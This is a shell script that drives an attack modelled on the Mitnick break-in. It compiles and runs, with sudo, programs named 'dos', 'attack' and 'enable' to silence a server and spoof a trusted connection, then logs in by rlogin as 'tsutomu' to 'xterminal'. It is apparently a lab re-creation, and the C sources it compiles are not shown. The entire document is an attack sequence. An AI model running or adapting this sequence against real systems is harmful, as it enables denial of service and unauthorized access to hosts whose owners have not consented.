#!/bin/sh
echo compiling
gcc -Wall -Wextra -O3 -o dos -lnet -lpcap dos.c
gcc -Wall -Wextra -O3 -o attack -lnet -lpcap attack.c
gcc -Wall -Wextra -O3 -o enable -lnet enable.c
echo disabling the server
sudo ./dos
sleep 1
echo starting the attack
sudo ./attack
sleep 1
echo re-enabling the server
sudo ./enable
sleep 1
echo waiting to connect
sleep 3
echo connecting to xterminal
rlogin -l tsutomu xterminal
